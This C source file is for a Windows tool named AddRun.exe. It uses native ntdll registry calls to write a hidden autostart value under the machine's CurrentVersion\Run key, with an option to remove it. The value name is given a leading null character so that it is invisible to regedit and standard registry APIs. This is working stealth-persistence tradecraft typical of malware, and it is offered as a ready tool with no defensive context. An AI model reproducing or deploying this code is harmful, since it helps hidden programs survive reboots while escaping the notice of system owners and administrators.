#include <stdio.h>
#include "defs.h"


BOOL InitFuncs()
{
	HMODULE hMod = GetModuleHandleA("ntdll.dll");
	if (hMod == NULL)
		return FALSE;

	_RtlInitUnicodeString = (PROC_RtlInitUnicodeString)GetProcAddress(hMod, "RtlInitUnicodeString");
	_NtOpenKey = (PROC_NtOpenKey)GetProcAddress(hMod, "NtOpenKey");
	_NtCreateKey = (PROC_NtCreateKey)GetProcAddress(hMod, "NtCreateKey");
	_NtDeleteKey = (PROC_NtDeleteKey)GetProcAddress(hMod, "NtDeleteKey");
	_NtSetValueKey = (PROC_NtSetValueKey)GetProcAddress(hMod, "NtSetValueKey");
	_NtClose = (PROC_NtClose)GetProcAddress(hMod, "NtClose");
	_NtDeleteValueKey = (PROC_NtDeleteValueKey)GetProcAddress(hMod,"NtDeleteValueKey");

	return TRUE;
}

void OpenRegistryKey(wchar_t KeyPath[], HANDLE* Key)
{
	//HANDLE hKey;
	OBJECT_ATTRIBUTES objAttrs;
	UNICODE_STRING KeyNameUni;
	NTSTATUS status;

	_RtlInitUnicodeString(&KeyNameUni, KeyPath);

	objAttrs = { sizeof(objAttrs),0,&KeyNameUni,OBJ_CASE_INSENSITIVE };

	status = _NtOpenKey(Key, KEY_ALL_ACCESS, &objAttrs);

	if (!NT_SUCCESS(status))
		printf("[!]Open key failed \n");
}

NTSTATUS __stdcall CreateHiddenValue(HANDLE hKey, wchar_t ValueName[], PVOID Data, ULONG DataSize, ULONG Type)
{
	UNICODE_STRING valueNameUni;
	NTSTATUS status;
	
	int origValueLenth = wcslen(ValueName);
	int bufferSize = origValueLenth * sizeof(wchar_t) + 2 + 2;
	wchar_t* buffer = (wchar_t*)malloc(bufferSize);

	if (buffer == NULL)
		return -1;
	memset(buffer, 0, bufferSize);
	buffer[0] = '\0';
	buffer = buffer + 1;
	for (int i = 0; i < origValueLenth; ++i) {
		buffer[i] = ValueName[i];
	}
	//init UNICODE VALUE NAME
	valueNameUni.Buffer = buffer;
	valueNameUni.Length = origValueLenth * sizeof(wchar_t); //not including the terminating NULL character
	valueNameUni.MaximumLength = bufferSize * 2; // it doesn't matter

	status = _NtSetValueKey(hKey, &valueNameUni, 0, Type, Data, DataSize);
	return status;
}

BOOL MyDeleteValueKey(HANDLE hKey, wchar_t* Name)
{
	UNICODE_STRING ValueName;
	_RtlInitUnicodeString(&ValueName, Name);
	NTSTATUS Status = _NtDeleteValueKey(hKey, &ValueName);
	if (!NT_SUCCESS(Status)) {
		printf("[!]DeleteValueKey Error:%ul\n", Status);
		return FALSE;
	}
	printf("[-]DeleteValueKey\n");
	printf("ValueName:	%ls\n", Name);
	return TRUE;
}

void addRun(wchar_t* exe_path) {
	NTSTATUS status;
	HANDLE hKey = NULL;
	wchar_t regPath[] = L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	wchar_t* data = exe_path;
	wchar_t name[] = L"HiddenTest";
	OpenRegistryKey(regPath, &hKey);
	if (hKey == 0)
		printf("open key failed \n");
	status = CreateHiddenValue(hKey, name, data, wcslen(data) * sizeof(wchar_t), REG_SZ);

	if (NT_SUCCESS(status))
		printf("value created successfully. \n");
	else
		printf("value create failed. \n");

}

void removeRun() {
	HANDLE hKey = NULL;
	wchar_t regPath[] = L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	wchar_t name[] = L"HiddenTest";
	OpenRegistryKey(regPath, &hKey);
	if (hKey == 0)
		printf("[!]open key failed \n");
	MyDeleteValueKey(hKey, name);
}



int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
{
	if (argc < 2) {
		printf("usage: \n");
		printf("AddRun.exe add C:\\example.exe  \n");
		printf("AddRun.exe remove  \n");
		return 0;
	}

	InitFuncs(); //Initialize
	if (!wcscmp(argv[1], L"add") && argc == 3) {
		printf("[+]ADD RUN: %ls \n", argv[2]);
		addRun(argv[2]);
		return 0;
	}
		

	if (!wcscmp(argv[1], L"remove") && argc == 2) {
		printf("[-]REMOVE RUN \n");
		removeRun();
		return 0;
	}
		
	return 0;
}